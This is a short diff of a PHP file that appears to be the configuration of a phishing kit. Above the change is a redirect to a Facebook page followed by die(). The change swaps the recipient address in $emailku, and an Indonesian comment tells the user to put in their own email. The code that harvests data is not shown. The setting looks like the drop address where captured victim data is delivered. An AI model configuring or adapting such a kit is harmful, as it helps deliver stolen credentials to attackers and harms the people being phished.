@@ -6,5 +6,5 @@ header('Location: http://www.facebook.com/IdhamDotID');
 die();
 }
 
-$emailku = "xtreamhost0@gmail.com"; // Ganti pake email loe
+$emailku = "pathorporosh55@gmail.com"; // Ganti pake email loe
 ?>
